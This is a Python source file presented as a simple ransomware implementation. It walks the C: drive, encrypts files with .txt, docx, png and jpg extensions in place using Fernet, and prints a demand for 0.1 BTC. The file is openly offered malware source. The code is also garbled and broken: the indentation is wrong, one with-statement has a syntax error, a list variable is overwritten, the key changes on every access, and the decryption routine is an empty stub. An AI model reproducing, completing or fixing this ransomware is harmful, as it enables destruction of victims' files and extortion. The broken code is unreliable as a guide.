""" Implementation of simple ransomware in Python.
"""

import logging
import os
import sys
from cryptography.fernet import Fernet


class Ransomware:
    """ This class represents file encrypting ransomware.
    """

    def __init__(self, name):
        self._name = name

    @property
    def name(self):
        """ Name of the malware. """
        return self._name

    @name.setter
    def name(self, new_name):
        self._name = new_name

    @property
    def key(self):
        """ Key used for encryption of data. """
        key = Fernet.generate_key()
        return key

    def obtain_key(self):
        """ Obtain key from a user. """
        return input("Please enter a key: ")

    def ransom_user(self):
        """ Inform user about encryption of his files. """
        print(
            "Hi, all your files has been encrypted. Please "
            "send 0.1 BTC on this address to get decryption"
        )

    def decrypt_file(self, key, filename):
        """ Decrypt the given file with AES encryption algoritm.
        :param str key: Decryption key.
        :param str filename: Name of the file.
        """

    def get_files_in_folder(self, path):
        """ Returns a `list` of all files in the folder.
        :param str path: Path to the folder
        """
        # List the directory to get all files.
        files = []
        for file in os.listdir(path):
            # For the demostration purposes ignore README.md
            # from the repository and this file.
            if file == 'README.md' or file == sys.argv[0]:
                continue

            file_path = os.path.join(path, file)
            if os.path.isfile(file_path):
                files.append(file_path)

        return files
    def get_all_files(self):
        files = [] #All files with the specified extension
        encrypted_ext = ('.txt','docx','png','jpg')
        for root, dirs, files in os.walk('C:\\'):
            for file in files:
                files, file_ext = os.path.splitext(root+'\\'+file)
                if file_ext in encrypted_ext:
                    files.append(root+'\\'+file)
        return files

    def encrypt_files_in_PC(self,key):
        """ Encrypt all files in the infectedPC
        :returns: Number of encrypted files (`int`).
        """
        num_encrypted_files = 0
        files = self.get_all_files()
            for file in files:
            with open(file, "rb") as thefile:
                contents = thefile.read()
                num_encrypted_files += 1
            contents_encrypted = Fernet(key).encrypt(contents)
            with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)
        self.ransom_user()

        return num_encrypted_files

    def decrypt_files_in_folder(self, path):
        """ Decrypt all files in the given directory specified
        by path.
        :param str path: Path of the folder to be decrypted.
        """
        # Obtain a key from the user.
        key = self.obtain_key()
        if key != self.key:
            print('Wrong key!')
            return

        files = self.get_files_in_folder(path)

        # Decrypt each file in the directory.
        for file in files:
            self.decrypt_file(key, file)


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)

    # Create ransomware.
    ransomware = Ransomware('SimpleRansomware')

    #Find all specified files
    files = ransomware.get_all_files
    
    #Generate key
    key = ransomware.key()
    with open("thekey.key","wb") sd thekey: #Key file in just to be sure we have the key, in real case scenarios this won't exist
            thekey.write(key)

    # Encrypt files located in the same folder as our ransomware.
    path = os.path.dirname(os.path.abspath(__file__))
    number_encrypted_files = ransomware.encrypt_files_in_PC(key)
    print('Number of encrypted files: {}'.format(number_encrypted_files))

    ransomware.decrypt_files_in_folder(path)